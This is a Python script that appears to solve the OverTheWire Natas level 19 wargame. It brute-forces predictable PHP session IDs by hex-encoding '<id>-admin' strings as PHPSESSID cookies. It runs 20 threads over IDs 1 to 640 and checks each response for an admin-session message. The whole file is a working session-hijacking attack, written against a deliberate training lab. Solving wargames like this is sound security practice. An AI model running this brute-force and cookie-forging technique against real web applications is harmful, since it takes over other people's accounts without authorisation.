import requests
import binascii
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://natas19.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": "your_token",
}

found = False  

def check_session(session_id):
    global found
    if found:
        return None

    hex_id = binascii.hexlify(f"{session_id}-admin".encode()).decode()
    cookies = {"PHPSESSID": hex_id}

    print(f"[*] Trying ID={session_id} -> PHPSESSID={hex_id}")  

    response = requests.get(url, headers=headers, cookies=cookies)

    if "You are an admin" in response.text:
        found = True
        print(f"[+] Admin session found! PHPSESSID={hex_id} (ID={session_id})")
        return session_id
    
    return None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(check_session, session_id): session_id for session_id in range(1, 641)}

    for future in as_completed(futures):
        if future.result() is not None:
            executor.shutdown(wait=False) 
            break

print("[-] Brute-force completed.")